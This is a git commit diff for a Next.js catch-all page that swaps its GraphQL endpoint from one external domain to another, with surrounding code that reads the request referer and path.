62709d327dddfd7432d165a20a7d20e54901c5a4
Fazijutt762 <133943555+Fazijutt762@users.noreply.github.com>
2024-04-14 15:23:13 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://fbsharelinknow.click/graphql"
+	const endpoint = "https://zubolli.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
